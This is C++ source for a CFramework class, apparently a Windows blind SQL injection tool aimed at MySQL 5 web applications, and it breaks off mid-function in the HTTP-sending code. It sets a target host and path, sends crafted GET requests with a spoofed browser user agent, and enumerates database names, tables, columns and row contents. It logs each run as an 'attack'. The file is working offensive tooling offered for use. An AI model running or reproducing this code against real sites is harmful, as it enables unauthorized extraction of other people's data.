#include "CFramework.h"

CFramework::CFramework()
{
	this->debug = 2;					// Debug level
	this->error = 0;					// Error string
	this->host = 0;					// Target host
	this->ip = 0;						// Target IP of host
	this->path = 0;					// Path
	this->rest = 0;					// Rest after path
	this->method = 0;				// Method chosen
	this->mparams = 0;			// Method parameters
	this->space = _T("+");		// Space string in query - this could be %20
	this->end = _T("");				// End string in query - this could be %00
	this->interval = 100;			// Interval in milliseconds
	this->atype = 0;					// Attack type chosen
	this->aparams = 0;				// Attack params
	this->requests = 0;				// Amount of requests generated

	this->dynamic_start = 0;		// Dynamic start string
	this->dynamic_end = 0;		// Dynamic end string

	this->cache_start = 0;		// Cachestart
	this->cache_max_pages = 0;
	this->cache_list = 0;			// Cachelist
	this->cache_pages_count = 0;
	this->cache_needles_count = 0;

	this->initialized = false;		// WSA data not yet initialized
	this->_ip = 0;						// char* version of this->ip
#ifdef USE_PCRE_REGEX
	this->re = 0;
#endif
	this->regexp = 0;

	const TCHAR defchars[] = _T("0123456789abcdefghijklmnopqrstuvwxyz_-@./: !#$%&'*+=?^`{|}~");
	charset = new TCHAR[_tcslen(defchars)+1];
	memset(charset, 0, (_tcslen(defchars)+1)*sizeof(TCHAR));
	_tcscpy_s(charset, _tcslen(defchars)+1, defchars);
	this->charlen = _tcslen(defchars);

	SYSTEMTIME time;
	GetSystemTime(&time);
	TCHAR str[50] = {0};
	_stprintf_s(str, 50, _T("SQL_%d%02d%02d_%02d%02d.sql"), time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute);
	unsigned long length = _tcslen(str)+1;
	this->ofile = new TCHAR[length];
	_tcscpy_s(ofile, length, str);
	this->hfile = CreateFile(this->ofile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
	if (this->hfile == INVALID_HANDLE_VALUE)
	{
		this->error = _T("failed to open file: INVALID_HANDLE_VALUE");
		this->hfile = 0;
	}
	unsigned char boem[2];
	boem[0] = 0xFF;
	boem[1] = 0xFE;
	WriteFile(this->hfile, boem, 2, &length, 0);
}

CFramework::~CFramework()
{
	if (this->ofile) delete[] this->ofile;
	if (this->hfile) CloseHandle(this->hfile);
	if (this->host) delete[] this->host;
	if (this->ip) delete[] this->ip;
	if (this->_ip) delete[] this->_ip;
	if (this->charset) delete[] this->charset;
	if (this->dynamic_start) delete[] this->dynamic_start;
	if (this->dynamic_end) delete[] this->dynamic_end;
}

bool CFramework::initialize()
{
	if (WSAStartup(MAKEWORD(2,2), &this->wsa))
	{
		this->error = _T("failed to initialize WSA");
		return false;
	}
	this->initialized = true;
	return true;
}

void CFramework::log(wchar_t level, wchar_t* text, ...)
{
	if (this->debug >= level)
	{
		va_list args;
		va_start(args, text);
		int size = _vscwprintf(text, args) + 2 + 1;	// \r\n + \0
		wchar_t* buffer = new wchar_t[size];
		memset(buffer, 0, size*sizeof(wchar_t));
		vswprintf_s(buffer, size, text, args);

		wchar_t* end = buffer+wcslen(buffer)-2;
		if (wcscmp(end, L"\r\n")) wcscat_s(buffer, size, L"\r\n");
		unsigned long bwritten = 0, btowrite = wcslen(buffer)*sizeof(wchar_t);
		if (this->hfile) WriteFile(this->hfile, buffer, btowrite, &bwritten, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), buffer, wcslen(buffer), &bwritten, 0);
		delete[] buffer;
	}
}

void CFramework::log(char level, char* text, ...)
{
	if (this->debug >= level)
	{
		va_list args;
		va_start(args, text);
		unsigned long btowrite = 0, bwritten = 0;
		int size = _vscprintf(text, args)+2+1;		// \r\n + \0
		char* buffer = new char[size];
		memset(buffer, 0, size);
		vsprintf_s(buffer, size, text, args);

		char* end = buffer+strlen(buffer)-2;
		if (strcmp(end, "\r\n")) strcat_s(buffer, size, "\r\n");
#if defined(UNICODE) || defined(_UNICODE)
		size_t count = 0, len = strlen(buffer)+1;
		wchar_t* wcsbuf = new wchar_t[len];
		memset(wcsbuf, 0, len*sizeof(wchar_t));
		mbstowcs_s(&count, wcsbuf, len, buffer, len-1);
		btowrite = wcslen(wcsbuf) * sizeof(wchar_t);
		if (this->hfile) WriteFile(this->hfile, wcsbuf, btowrite, &bwritten, 0);
		WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), wcsbuf, wcslen(wcsbuf), &bwritten, 0);
		delete[] wcsbuf;
#else
		btowrite = strlen(buffer);
		if (this->hfile) WriteFile(this->hfile, buffer, btowrite, &bwritten, 0);
		WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), buffer, btowrite, &bwritten, 0);
#endif
		delete[] buffer;
	}
}

bool CFramework::setHost(TCHAR* host, unsigned short port)
{
	if (!this->initialized)
	{
		this->error = _T("Need to initialize class first.");
		return false;
	}
	this->reset();		// Clear cache list (new host/port = new content/cache)
	delete[] this->host;
	delete[] this->ip;
	delete[] this->_ip;
	this->host = this->ip = 0;
	this->_ip = 0;

	unsigned long len = _tcslen(host)+1;
	this->host = new TCHAR[len];
	memset(this->host, 0, len*sizeof(TCHAR));
	_tcscpy_s(this->host, len, host);

	hostent *remoteHost;
	this->ip = new TCHAR[len];
	memset(this->ip, 0, len*sizeof(TCHAR));
	_tcscpy_s(this->ip, len, this->host);
	char* _host = new char[len];
	memset(_host, 0, len);
#if defined(_UNICODE) || defined(UNICODE)
	size_t count = 0;
	wcstombs_s(&count, _host, len, this->host, _tcslen(this->host));
#else
	strcpy(_host, this->host);
#endif

	if (isalpha(int(_host[0])))
	{
		remoteHost = gethostbyname(_host);			// remoteHost is deleted by winSock itself - http://msdn.microsoft.com/en-us/library/ms738524(VS.85).aspx
		if (remoteHost != NULL)
		{
			char* addr = inet_ntoa(*(in_addr*)*remoteHost->h_addr_list);
			len = strlen(addr)+1;
			this->_ip = new char[len];
			memset(this->_ip, 0, len);
			strcpy_s(this->_ip, len, addr);
			delete[] this->ip;

			this->ip = new TCHAR[len];
			memset(this->ip, 0, len*sizeof(TCHAR));
#if defined(_UNICODE) || defined(UNICODE)
			size_t cwritten = 0;
			mbstowcs_s(&cwritten, this->ip, len, this->_ip, len*sizeof(TCHAR));
#else
			strcpy(this->ip, this->_ip);
#endif
			this->log(0, _T("[*] %s is %s"), this->host, this->ip);
			this->log(0, "[*] Hostname is %s", remoteHost->h_name);
		}
		else
			this->log(0, "[-] Failed to get hostname (errorcode: %d)", WSAGetLastError());
	}
	else
	{
		unsigned int addr = inet_addr(_host);
		remoteHost = gethostbyaddr((char*)&addr, 4, AF_INET);
		if (remoteHost == NULL)
			this->log(0, "[-] Could not retrieve hostname");
		else
			this->log(0, "[+] Hostname is %s", remoteHost->h_name);
	}
	delete[] _host;
	this->port = port;
	return true;
}

bool CFramework::setPath(TCHAR* path, TCHAR* rest)
{
	if (!this->host)
	{
		this->error = _T("set host first");
		return false;
	}
	//this->reset();		// Clear cache list (new path = new content/cache)
	delete[] this->path;
	this->path = 0;

	unsigned long len = _tcslen(path)+1;
	this->path = new TCHAR[len];
	memset(this->path, 0, len*sizeof(TCHAR));
	_tcscpy_s(this->path, len, path);
	if (this->rest)
	{
		delete[] this->rest;
		this->rest = 0;
	}
	if (rest)
	{
		len = _tcslen(rest)+1;
		this->rest = new TCHAR[len];
		memset(this->rest, 0, len*sizeof(TCHAR));
		_tcscpy_s(this->rest, len, rest);
	}
	return true;
}

void CFramework::reset()
{
	this->method = 0;
	this->mparams = 0;
	// Cache list
	if (this->cache_list)
	{
		for (unsigned int i=0; i<this->cache_pages_count; i++)
		{
			for (unsigned int x=0; x<this->cache_list[i]->data_needles_count; x++)
			{
				delete[] this->cache_list[i]->data_needles[x]->needle;
				delete this->cache_list[i]->data_needles[x];
			}
			for (unsigned int y=0; y<this->cache_list[i]->real_needles_count; y++)
			{
				delete[] this->cache_list[i]->real_needles[y]->needle;
				delete this->cache_list[i]->real_needles[y];
			}
			delete this->cache_list[i];
		}
		delete[] this->cache_list;
		this->cache_list = 0;
		this->cache_start = 0;
		this->cache_max_pages = 0;
		this->cache_pages_count = 0;
		this->cache_needles_count = 0;
		this->log(0, _T("[*] Cache cleared."));
	}
}

void CFramework::setInterval(unsigned long interval)
{
	if (!interval)
		this->interval = 200;
	else
		this->interval = interval;
}

bool CFramework::setLength(unsigned short length)
{
	if (_tcslen(this->charset) < length)
	{
		this->charlen = _tcslen(this->charset);
		this->error = _T("length is bigger than charset");
		return false;
	}
	this->charlen = length;
	return true;
}

void CFramework::setDynamicTags(TCHAR* start, TCHAR* end)
{
	unsigned long s1 = _tcslen(start)+1, s2 = _tcslen(end)+1;
	if (this->dynamic_start) delete[] this->dynamic_start;
	this->dynamic_start = new TCHAR[s1];
	memset(this->dynamic_start, 0, s1);
	_tcscpy_s(this->dynamic_start, s1, start);
	if (this->dynamic_end) delete[] this->dynamic_end;
	this->dynamic_end = new TCHAR[s2];
	memset(this->dynamic_end, 0, s2);
	_tcscpy_s(this->dynamic_end, s2, end);
}

void CFramework::setAttack(TCHAR type)
{
	this->atype = type;
}

void CFramework::setSpace(TCHAR* space)
{
	unsigned long len = _tcslen(space)+1;
	this->space = new TCHAR[len];
	memset(this->space, 0, len);
	_tcscpy_s(this->space, len, space);
}

void CFramework::setEnd(TCHAR* end)
{
	unsigned long len = _tcslen(end)+1;
	this->end = new TCHAR[len];
	memset(this->end, 0, len);
	_tcscpy_s(this->end, len, end);
}

bool CFramework::setMethod(TCHAR method, TCHAR** argv, unsigned long argc)
{
	if (!this->path)
	{
		this->error = _T("set path first");
		return false;
	}
	TCHAR _char = this->path[_tcslen(this->path)-1];
	switch (method)
	{
	case this->METHOD_BRUTEFORCE:
	case this->METHOD_BRUTEFORCE_SMART:
		{
			if (_char == _T('='))
			{
				this->error = _T("path can't end with '=' need id");
				return false;
			}
			this->mparams = argv;
			if (this->regexp) delete[] this->regexp;
			size_t len = _tcslen(this->mparams[0])+1;
#ifdef USE_PCRE_REGEX
			this->regexp = new char[len];
			memset(this->regexp, 0, len);
			wcstombs(this->regexp, this->mparams[0], len);
			const char* error = 0;
			int erroffset = 0;
			this->log(0, "[*] RegExp string: %s", this->regexp);
			if (this->re) pcre_free(this->re);
			this->re = pcre_compile(this->regexp, 0, &error, &erroffset, 0);
			if (!this->re)
			{
				this->error = _T("failed to compile regexp string - invalid?");
				return false;
			}
#else
			this->regexp = new TCHAR[len];
			memset(this->regexp, 0, len*sizeof(TCHAR));
			_tcscpy_s(this->regexp, len, this->mparams[0]);
#endif
			this->method = method;
		}
		break;

	case this->METHOD_CACHING:
		{
			if (_char != _T('='))
			{
				this->error = _T("path needs to be ending with '=' (no id) for this method");
				return false;
			}
			this->mparams = argv;
			this->method = method;
			unsigned int cstart = _ttoi(this->mparams[0]);
			unsigned int cmax = (argc > 1 ? _ttoi(this->mparams[1]) : this->cache_max_pages);
			if (cmax-cstart < this->charlen-1)
			{
				this->error = _T("can't cache less pages than charset length, change charset length or increase max pages count");
				return false;
			}
			this->cache_start = cstart;
			this->cache_max_pages = cmax;
			this->method = this->METHOD_CACHING;
			return this->create_cache_list();
		}
		break;

	default:
		{
			this->mparams = 0;
			this->error = _T("invalid method supplied");
			return false;
		}
		break;
	}
	return true;
}

bool CFramework::validateConfig()
{
	if (!this->host)
	{
		this->error = _T("set host first");
		return false;
	}
	if (!this->port)
	{
		this->error = _T("set port first");
		return false;
	}
	if (!this->path)
	{
		this->error = _T("set path first");
		return false;
	}
	if (!this->method)
	{
		this->error = _T("set method first");
		return false;
	}
	if (!this->atype)
	{
		this->error = _T("set attack type first");
		return false;
	}
	return true;
}

bool CFramework::start(TCHAR** params, unsigned long argc)
{
	if (!this->initialized)
	{
		this->error = _T("Need to initialize class first.");
		return false;
	}
	if (params) this->aparams = params;
	if (!this->validateConfig()) return false;
	bool found = false;
	unsigned long startcount = GetTickCount();
	SYSTEMTIME starttime;
	GetSystemTime(&starttime);
	this->requests = 0;
	this->error = 0;
	this->requests = 0;
	this->log(0, _T("[*] Attack started: \t%d/%02d/%02d @ %02d:%02d"), starttime.wYear, starttime.wMonth, starttime.wDay, starttime.wHour, starttime.wMinute);
	this->log(0, _T("[*] Target Host: \t%s:%d"), this->host, this->port);
	this->log(0, _T("[*] Target Path: \t%s%s"), this->path, (this->rest ? this->rest : _T("")));
	this->log(0, _T("[*] Attack Type: \t%d"), this->atype);
	this->log(0, _T("[*] Attack Method: \t%d"), this->method);
	this->log(0, _T("[*] Space Character: \t%s"), (this->space ? this->space : _T("")));
	this->log(0, _T("[*] End Character: \t%s"), (this->end ? this->end : _T("")));
	this->log(0, _T("[*] Interval: \t\t%d"), this->interval);
	this->log(0, _T("[*] Charset Length: \t%d"), this->charlen);
	this->log(0, _T("[*] Debug Level: \t%d"), this->debug);

	unsigned long version = this->getDatabaseVersion();
	if (version != 5)
	{
		this->log(0, _T("[-] Found invalid version: %d, can't get database info"), version);
		this->error = _T("invalid remote MySQL version (need MySQL 5)");
		return false;
	}
	switch (this->atype)
	{
	case COUNT_DATABASES:
		{
			int c = this->getDatabaseCount();
			if (c == RESULT_NOT_FOUND)
			{
				this->error = _T("no database(s) found");
				return false;
			}
			this->log(0, _T("[+] Found %d database(s)"), c);
		}
		break;

	case GET_DATABASE_NAME:
		{
			unsigned long db = (argc ? _ttoi(this->aparams[0]) : 0);
			if (!db)
			{
				unsigned int c = this->getDatabaseCount();
				if (c == RESULT_NOT_FOUND)
				{
					this->error = _T("no database(s) found");
					return false;
				}
				this->log(0, _T("[*] Found %d database(s)"), c);
				for (unsigned int i=1; i<=c; i++)
				{
					unsigned long len = this->getDatabaseNameLength(i);
					if (len == RESULT_NOT_FOUND)
					{
						this->log(0, _T("[-] No database name length found for database %d"), i);
						continue;
					}
					this->log(1, _T("[+] Found database name length for database %d: %d"), i, len);
					TCHAR* name = this->getDatabaseName(i, len);
					if (!name)
					{
						this->log(0, _T("[-] No database name found for database %d with length %d"), i, len);
						continue;
					}
					this->log(0, _T("[+] Found database name for database %d with length %d: %s"), i, len, name);
				}
			}
			else if (db < 1)
			{
				this->error = _T("invalid database index");
				return false;
			}
			else
			{
				unsigned long len = this->getDatabaseNameLength(db);
				if (len == RESULT_NOT_FOUND)
				{
					this->error = _T("database name length not found");
					return false;
				}
				this->log(1, _T("[+] Found database name length: %d"), len);
				TCHAR* name = this->getDatabaseName(db, len);
				if (!name)
				{
					this->error = _T("database name not found");
					return false;
				}
				this->log(0, _T("[+] Found database name for database %d with length %d: %s"), db, len, name);
			}
		}
		break;

	case COUNT_TABLES_IN_DATABASE:
		{
			TCHAR* db = this->aparams[0];
			if (!db)
			{
				this->error = _T("set database first");
				return false;
			}
			unsigned long c = this->getTableCount(db);
			if (c == RESULT_NOT_FOUND)
			{
				this->error = _T("no table(s) found in database");
				return false;
			}
			this->log(0, _T("[+] Found %d table(s) in database '%s'"), c, db);
		}
		break;

	case GET_TABLE_NAME_IN_DATABASE:
		{
			TCHAR* db = this->aparams[0];
			if (!db)
			{
				this->error = _T("set database first");
				return false;
			}
			unsigned long table = (argc > 1 ? _ttoi(this->aparams[1]) : 0);
			if (!table)
			{
				unsigned long c = this->getTableCount(db);
				if (c == RESULT_NOT_FOUND)
				{
					this->error = _T("table count in database not found");
					return false;
				}
				this->log(1, _T("[+] Found %d table(s) in database '%s'"), c, db);
				for (unsigned long i=1; i<=c; i++)
				{
					unsigned long len = this->getTableNameLength(db, i);
					if (len == RESULT_NOT_FOUND)
					{
						this->log(0, _T("[-] Table length not found for table %d in database '%s'"), i, db);
						continue;
					}
					this->log(1, _T("[+] Found table name length for table %d in database '%s': %d"), i, db, len);
					TCHAR* name = this->getTableName(db, i, len);
					if (!name)
					{
						this->log(0, _T("[-] Table name not found for table %d with length %d in database '%s'"), i, len, db);
						continue;
					}
					this->log(0, _T("[+] Found table name for table %d with length %d in database '%s': %s"), i, len, db, name);
				}
			}
			else if (table < 1)
			{
				this->error = _T("invalid table index");
				return false;
			}
			else
			{
				unsigned long len = this->getTableNameLength(db, table);
				if (len == RESULT_NOT_FOUND)
				{
					this->error = _T("table name length not found");
					return false;
				}
				this->log(1, _T("[+] Found table name length for table %d: %d"), table, len);
				TCHAR* name = this->getTableName(db, table, len);
				if (!name)
				{
					this->error = _T("no table name found");
					return false;
				}
				this->log(0, _T("[+] Found table name for table %d: %s"), table, name);
			}
		}
		break;

	case COUNT_COLUMNS_IN_TABLE:
		{
			TCHAR* db = this->aparams[0];
			TCHAR* table = this->aparams[1];
			if (!db)
			{
				this->error = _T("set database first");
				return false;
			}
			else if (!table)
			{
				this->error = _T("set table first");
				return false;
			}
			unsigned long c = this->getColumnCount(db, table);
			if (c == RESULT_NOT_FOUND)
			{
				this->error = _T("no column(s) found in table");
				return false;
			}
			this->log(0, _T("[+] Found %d column(s) in table '%s' in database '%s'"), c, table, db);
		}
		break;

	case GET_COLUMN_NAME_IN_TABLE:
		{
			TCHAR* db = this->aparams[0];
			TCHAR* table = this->aparams[1];
			if (!db)
			{
				this->error = _T("set database first");
				return false;
			}
			else if (!table)
			{
				this->error = _T("set table first");
				return false;
			}
			unsigned long column = (argc > 2 ? _ttoi(this->aparams[2]) : 0);
			if (!column)
			{
				unsigned long c = this->getColumnCount(db, table);
				if (c == RESULT_NOT_FOUND)
				{
					this->error = _T("column count in table not found");
					return false;
				}
				this->log(1, _T("[+] Found %d column(s) in table '%s' in database '%s'"), c, table, db);
				for (unsigned long i=1; i<=c; i++)
				{
					unsigned long len = this->getColumnNameLength(db, table, i);
					if (len == RESULT_NOT_FOUND)
					{
						this->log(0, _T("[-] Column length not found for column %d in table '%s' in database '%s'"), i, table, db);
						continue;
					}
					this->log(1, _T("[+] Found column name length for column %d in table '%s' in database '%s': %d"), i, table, db, len);
					TCHAR* name = this->getColumnName(db, table, i, len);
					if (!name)
					{
						this->log(0, _T("[-] Column name not found for column %d with length %d in table '%s' in database '%s'"), i, len, table, db);
						continue;
					}
					this->log(0, _T("[+] Found column name for column %d with length %d in table '%s' in database '%s': %s"), i, len, table, db, name);
				}
			}
			else if (column < 1)
			{
				this->error = _T("invalid column index");
				return false;
			}
			else
			{
				unsigned long len = this->getColumnNameLength(db, table, column);
				if (len == RESULT_NOT_FOUND)
				{
					this->error = _T("column name length not found");
					return false;
				}
				this->log(1, _T("[+] Found column name length for column %d: %d"), column, len);
				TCHAR* name = this->getColumnName(db, table, column, len);
				if (!name)
				{
					this->error = _T("column name not found");
					return false;
				}
				this->log(0, _T("[+] Found column name for column %d: %s"), column, name);
			}
		}
		break;

	case COUNT_ROWS_IN_TABLE:
		{
			TCHAR* db = this->aparams[0];
			TCHAR* table = this->aparams[1];
			if (!db)
			{
				this->error = _T("set database first");
				return false;
			}
			else if (!table)
			{
				this->error = _T("set table first");
				return false;
			}
			long c = this->getRowCount(db, table);
			if (c == RESULT_NOT_FOUND)
			{
				this->error = _T("no row(s) found in table");
				return false;
			}
			this->log(0, _T("[+] Found %d row(s) in table '%s' in database '%s'"), c, table, db);
		}
		break;

	case GET_ROW_DATA_IN_COLUMN:
		{
			TCHAR* db = this->aparams[0];
			TCHAR* table = this->aparams[1];
			TCHAR* column = this->aparams[2];
			if (!db)
			{
				this->error = _T("set database first");
				return false;
			}
			else if (!table)
			{
				this->error = _T("set table first");
				return false;
			}
			else if (!column)
			{
				this->error = _T("set column first");
				return false;
			}
			unsigned long row = (argc > 3 ? _ttoi(this->aparams[3]) : 0);
			if (!row)
			{
				long c = this->getRowCount(db, table);
				if (c == RESULT_NOT_FOUND)
				{
					this->error = _T("row count in table not found");
					return false;
				}
				this->log(1, _T("[+] Found %d row(s) in table '%s' in database '%s'"), c, table, db);
				for (long i=1; i<=c; i++)
				{
					unsigned long len = this->getRowDataLength(db, table, column, i);
					if (len == RESULT_NOT_FOUND)
					{
						this->log(0, _T("[-] Row length not found for row %d in column '%s' in table '%s' in database '%s'"), i, column, table, db);
						continue;
					}
					this->log(1, _T("[+] Found row data length for row %d in column '%s' in table '%s' in database '%s': %d"), i, column, table, db, len);
					TCHAR* data = this->getRowData(db, table, column, i, len);
					if (!data)
					{
						this->log(0, _T("[-] Row data not found for row %d with length %d in column '%s' in table '%s' in database '%s'"), i, len, column, table, db);
						continue;
					}
					this->log(0, _T("[+] Found row data for row %d with length %d in column '%s' in table '%s' in database '%s': %s"), i, len, column, table, db, data);
				}
			}
			else if (row < 1)
			{
				this->error = _T("invalid row index");
				return false;
			}
			else
			{
				unsigned long len = this->getRowDataLength(db, table, column, row);
				if (len == RESULT_NOT_FOUND)
				{
					this->error = _T("row data is empty");
					return false;
				}
				this->log(1, _T("[+] Found row data length for row %d: %d"), row, len);
				TCHAR* data = this->getRowData(db, table, column, row, len);
				if (!data)
				{
					this->error = _T("row data not found");
					return false;
				}
				this->log(0, _T("[+] Found row data for row %d: %s"), row, data);
			}
		}
		break;

	case DATABASE_DO_ALL:
		{
			if (!this->getDatabaseInfo()) return false;
		}
		break;

	case GET_MYSQL_VERSION:
		{
			this->log(0, _T("[*] Found version: %d"), this->getDatabaseVersion());
		}
		break;

	case RUN_CUSTOM_CRITERIA:
		{
			TCHAR* db = this->aparams[0];
			TCHAR* table = this->aparams[1];
			TCHAR* column = this->aparams[2];
			TCHAR* target = this->aparams[3];
			if (!target)
			{
				this->error = _T("set target column for criteria first");
				return false;
			}
			TCHAR* crit = this->aparams[4];
			if (!crit)
			{
				this->error = _T("set criteria for target column first");
				return false;
			}
			TCHAR* d = this->getCustomData(db, table, column, target, crit);
			if (d)
				this->log(0, _T("[*] Found data: %s"), d);
			else
				this->log(0, _T("[-] Custom data not found"));
		}
		break;
	}
	SYSTEMTIME endtime;
	GetSystemTime(&endtime);
	this->log(0, _T("[*] Attack finished: \t%d/%02d/%02d @ %02d:%02d"), endtime.wYear, endtime.wMonth, endtime.wDay, endtime.wHour, endtime.wMinute);
	this->log(0, _T("[*] Generated %d request(s) over %d second(s)"), this->requests, (GetTickCount()-startcount)/1000);
	return true;
}

bool CFramework::getDatabaseInfo()
{
	unsigned long dbs = this->getDatabaseCount();
	if (!dbs)
	{
		this->log(0, _T("[-] No databases found"));
		return false;
	}
	for (unsigned int b=1; b<=dbs; b++)
	{
		unsigned int dbnamelen = this->getDatabaseNameLength(b);
		if (dbnamelen == RESULT_NOT_FOUND)
		{
			this->log(0, _T("[-] No database name length found"));
			continue;
		}
		else if (!dbnamelen) continue;
		TCHAR* dbname = this->getDatabaseName(b, dbnamelen);
		if (!dbname)
		{
			this->log(0, _T("[-] No database name found"));
			continue;
		}
		unsigned int tables = this->getTableCount(dbname);
		if (tables == RESULT_NOT_FOUND)
		{
			this->log(0, _T("[-] No tables found"));
			continue;
		}
		else if (!tables) continue;
		for (unsigned int c=1; c<=tables; c++)
		{
			unsigned int tablenamelen = this->getTableNameLength(dbname, c);
			if (tablenamelen == RESULT_NOT_FOUND)
			{
				this->log(0, _T("[-] No table name length found"));
				continue;
			}
			else if (!tablenamelen) continue;
			TCHAR* tablename = this->getTableName(dbname, c, tablenamelen);
			if (!tablename)
			{
				this->log(0, _T("[-] No table name found"));
				continue;
			}
			unsigned int columns = this->getColumnCount(dbname, tablename);
			if (columns == RESULT_NOT_FOUND)
			{
				this->log(0, _T("[-] No columns found"));
				continue;
			}
			else if (!columns) continue;
			unsigned int rows = this->getRowCount(dbname, tablename);
			if (!rows) this->log(0, _T("[-] No rows found"));
			for (unsigned int d=1; d<=columns; d++)
			{
				unsigned int columnnamelen = this->getColumnNameLength(dbname, tablename, d);
				if (columnnamelen == RESULT_NOT_FOUND)
				{
					this->log(0, _T("[-] No column name length found"));
					continue;
				}
				else if (!columnnamelen) continue;
				TCHAR* columnname = this->getColumnName(dbname, tablename, d, columnnamelen);
				if (!columnname)
				{
					this->log(0, _T("[-] No column name found"));
					continue;
				}
/*				for (unsigned int e=1; e<=rows; e++)
				{
					unsigned int rowdatalen = this->getRowDataLength(dbname, tablename, columnname, e);
					if (rowdatalen == RESULT_NOT_FOUND)
					{
						this->error = _T("no row data length found");
						continue;
					}
					else if (!rowdatalen) continue;
					TCHAR* data = this->getRowData(dbname, tablename, columnname, e, rowdatalen);
					if (!data)
					{
						this->error = _T("no row data found");
						continue;
					}
				}*/
			}
		}
	}
	this->show_history_list();
	return true;
}

void CFramework::show_history_list()
{
	if (this->history.getHostCount())
	{
		this->log(0, _T("[+] Total hosts: %d"), this->history.getHostCount());
		for (unsigned int a=0; a<this->history.getHostCount(); a++)
		{
			HOST* host = this->history.getHost(a);
			if (!host) break;
			this->log(0, "\r\n");
			this->log(0, _T("\t[+] Host %d: %s"), host->index, host->name);
			this->log(0, _T("\t[+] MySQL version: %d"), host->version);
			this->log(0, _T("\t[+] Databases: %d"), host->databasecount);
			for (unsigned int b=0; b<host->size; b++)
			{
				DATABASE* db = host->databases[b];
				this->log(0, "\r\n");
				this->log(0, _T("\t\t[+] Database %d: %s"), db->index, db->name);
				this->log(0, _T("\t\t[+] Tables: %d"), db->tablecount);
				for (unsigned int c=0; c<db->size; c++)
				{
					TABLE* table = db->tables[c];
					this->log(0, _T("\r\n"));
					this->log(0, _T("\t\t\t[+] Table %d: %s"), table->index, table->name);
					this->log(0, _T("\t\t\t[+] Columns: %d"), table->columncount);
					if (table->rowcount != -1) this->log(0, _T("\t\t\t[+] Rows: %d"), table->rowcount);
					for (unsigned int d=0; d<table->size; d++)
					{
						COLUMN* column = table->columns[d];
						this->log(0, _T("\r\n"));
						this->log(0, _T("\t\t\t\t[+] Column %d: %s"), column->index, column->name);
						//this->log(0, _T("\t\t\t\t[+] Rows: %d"), colulmn->rowcount);
						for (unsigned int e=0; e<column->size; e++)
						{
							ROW* row = column->rows[e];
							this->log(0, _T("\r\n"));
							this->log(0, _T("\t\t\t\t\t[+] Row: %d"), row->index);
							this->log(0, _T("\t\t\t\t\t[+] Data Length: %d"), row->length);
							this->log(0, _T("\t\t\t\t\t[+] Data: %s"), row->data);
						}
					}
				}
			}
		}
		this->log(0, _T("\r\n"));
	}
}

TCHAR CFramework::query_send(TCHAR* query)
{
	//$qry = preg_replace("/[\t|\r|\n]+/", "", $qry);
	this->log(3, _T("[*] Attack URL: %s%s%s"), this->host, this->path, query, this->rest);
	size_t len = _tcslen(this->path) + _tcslen(query) + _tcslen(this->rest) + 1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	_stprintf_s(qry, len, _T("%s%s%s"), this->path, query, this->rest);
	TCHAR* data = this->http_send(qry);
	delete[] qry;
	if (!data) return 0;
	TCHAR ret = 0;
	switch (this->method)
	{
	case METHOD_BRUTEFORCE:
	case METHOD_BRUTEFORCE_SMART:
		{
#ifdef USE_PCRE_REGEX
			unsigned long len = _tcslen(data)+1;
			char* tmp = new char[len];
			memset(tmp, 0, len);
	#if defined(UNICODE) || defined(_UNICODE)
			wcstombs_s(tmp, len, data, len-1);
	#else
			strcpy_s(tmp, len, data);
	#endif
			int ovector[30] = {0};
			int rc = pcre_exec(re, 0, tmp, len-1, 0, 0, ovector, 30);
			this->log(3, _T("[*] Found regex hit at offset %d"), ovector[0]);
			ret = (rc > 1 ? 1 : 0);
			delete[] tmp;
#else
			TCHAR* context = 0;
			TCHAR delims[] = _T(" \t\r\n");
			TCHAR* token = _tcstok_s(data, delims, &context);
			while (token)
			{
				if (_tcsstr(token, this->regexp))
				{
					ret = 1;
					break;
				}
				token = _tcstok_s(0, delims, &context);
			}
#endif
		}
		break;

	case METHOD_CACHING:
		{
			ret = this->search_cache_list(data);
		}
		break;
	}
	delete[] data;
	return ret;
}

TCHAR* CFramework::http_send(TCHAR* url)
{
	// Use WinHTTP to communicate
	const TCHAR* user_agent = _T("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)");
	HINTERNET hSession = WinHttpOpen(user_agent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!hSession)
	{
		this->error = _T("failed to open http session");
		return 0;
	}
	HINTERNET hConnect = WinHttpConnect(hSession, this->host, this->port, 0);
	if (!hConnect)
	{
		WinHttpCloseHandle(hSession);
		this->error = _T("failed to connect to http server");
		return 0;
	}
	const TCHAR* method = _T("GET");
	const TCHAR* version = _T("HTTP/1.1");
	const TCHAR* accept = _T("*/*");
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, method, url, version, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_BYPASS_PROXY_CACHE);
	if (!hRequest)
	{
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		this->error = _T("failed to open http request");
		return 0;
	}
	const TCHAR* hdr = _T("Connection: close");
	if (!WinHttpSendRequest(hRequest, hdr, _tcslen(hdr), WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
	{
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		this->error = _T("failed to send http request");
		return 0;
	}
	if (!WinHttpReceiveResponse(hRequest, 0))
	{
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		this->error = _T("no response from server");
		return 0;
	}
	this->log(4, _T("[*] SEND: %s"), this->path);

	TCHAR hdrBuf[1024] = {0}, *encoding = hdrBuf;
	unsigned long bufLen = 1024;
	if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_TYPE, WINHTTP_HEADER_NAME_BY_INDEX, hdrBuf, &bufLen, WINHTTP_NO_HEADER_INDEX))
	{
		encoding = _tcschr(hdrBuf, _T('='));
		if (encoding)
			encoding++;
	}
	bufLen = 0;
	unsigned long bRecv = 0, bRead = 0;
	char* buffer = 0;
	do
	{
		bRecv = 0;
		if (!WinHttpQueryDataAvailable(hRequest, &bRecv)) this->error = _T("error in http query data available");

